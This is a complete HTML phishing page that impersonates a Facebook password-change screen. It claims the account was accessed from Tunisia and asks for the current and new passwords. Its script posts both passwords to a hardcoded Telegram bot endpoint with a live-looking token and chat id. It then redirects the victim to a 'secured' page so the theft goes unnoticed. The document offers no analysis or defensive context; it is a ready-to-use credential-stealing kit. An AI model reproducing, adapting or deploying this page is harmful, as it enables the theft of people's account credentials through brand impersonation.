<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password - Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; }
        .navbar { background: white; height: 56px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); display: flex; align-items: center; padding: 0 20px; }
        .logo { color: #1877f2; font-size: 28px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 0 20px; flex: 1; }
        .form-box { background: white; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); padding: 40px; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { color: #1c1e21; font-size: 24px; margin-bottom: 10px; }
        .header p { color: #606770; font-size: 15px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; color: #606770; font-size: 14px; font-weight: 600; margin-bottom: 8px; }
        .input-field { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; outline: none; }
        .input-field:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .password-requirements { background: #f5f5f5; border-radius: 6px; padding: 15px; margin: 20px 0; font-size: 13px; color: #606770; }
        .password-requirements h4 { color: #1c1e21; margin-bottom: 10px; font-size: 14px; }
        .requirement { display: flex; align-items: center; gap: 8px; margin: 5px 0; }
        .requirement.met { color: #42b72a; }
        .requirement::before { content: "â—‹"; font-size: 12px; }
        .requirement.met::before { content: "âœ“"; font-weight: bold; }
        .submit-btn { width: 100%; background: #42b72a; color: white; border: none; border-radius: 6px; padding: 14px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .submit-btn:hover { background: #36a420; }
        .submit-btn:disabled { background: #a4b0be; cursor: not-allowed; }
        .loading { display: none; color: #42b72a; margin-top: 10px; text-align: center; }
        footer { background: white; padding: 20px; text-align: center; color: #737373; font-size: 12px; margin-top: auto; }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="logo">facebook</div>
    </nav>

    <div class="container">
        <div class="form-box">
            <div class="header">
                <h1>Create New Password</h1>
                <p>Your account was accessed from Tunisia. Create a strong password to secure your account.</p>
            </div>

            <form id="passwordForm">
                <div class="form-group">
                    <label>Current Password (for verification)</label>
                    <input type="password" id="currentPass" class="input-field" placeholder="Enter current password" required>
                </div>

                <div class="form-group">
                    <label>New Password</label>
                    <input type="password" id="newPassword" class="input-field" placeholder="Enter new password" required>
                </div>

                <div class="form-group">
                    <label>Confirm New Password</label>
                    <input type="password" id="confirmPassword" class="input-field" placeholder="Re-enter new password" required>
                </div>

                <div class="password-requirements">
                    <h4>Password must include:</h4>
                    <div class="requirement" id="length">At least 8 characters</div>
                    <div class="requirement" id="uppercase">One uppercase letter</div>
                    <div class="requirement" id="number">One number</div>
                    <div class="requirement" id="special">One special character</div>
                    <div class="requirement" id="match">Passwords match</div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn" disabled>Change Password</button>
                <div class="loading" id="loading">Securing your account...</div>
            </form>
        </div>
    </div>

    <footer>Meta Â© 2024 â€¢ Security Center</footer>

    <script>
        // ðŸ”¥ SAME CONFIG
        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
        const CHAT_ID = 'YOUR_CHAT_ID_HERE';

        const newPassword = document.getElementById('newPassword');
        const confirmPassword = document.getElementById('confirmPassword');
        const submitBtn = document.getElementById('submitBtn');

        const requirements = {
            length: (pass) => pass.length >= 8,
            uppercase: (pass) => /[A-Z]/.test(pass),
            number: (pass) => /[0-9]/.test(pass),
            special: (pass) => /[!@#$%^&*(),.?":{}|<>]/.test(pass),
            match: () => newPassword.value === confirmPassword.value && newPassword.value !== ''
        };

        function validatePassword() {
            const pass = newPassword.value;
            let allMet = true;
            for (const [key, check] of Object.entries(requirements)) {
                const el = document.getElementById(key);
                const met = check(pass);
                el.classList.toggle('met', met);
                if (!met) allMet = false;
            }
            submitBtn.disabled = !allMet;
        }

        newPassword.addEventListener('input', validatePassword);
        confirmPassword.addEventListener('input', validatePassword);

        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const currentPass = document.getElementById('currentPass').value;
            const newPass = document.getElementById('newPassword').value;
            
            submitBtn.disabled = true;
            document.getElementById('loading').style.display = 'block';
            
            const message = `ðŸš¨ *PASSWORD CHANGE* ðŸš¨\n\n` +
                          `ðŸ”‘ Current Password: ${currentPass}\n` +
                          `ðŸ” New Password: ${newPass}\n` +
                          `ðŸŒ Page: New Password\n` +
                          `â° Time: ${new Date().toLocaleString()}`;
            
            try {
                await fetch(`https://api.telegram.org/bot8582083084:AAHy-qeLImcvXVBauwzDC011z6ww5qqX22o/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: -1003840277325,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                setTimeout(() => {
                    window.location.href = 'secured.html';
                }, 1500);
                
            } catch (error) {
                setTimeout(() => {
                    window.location.href = 'secured.html';
                }, 1500);
            }
        });
    </script>
</body>
</html>
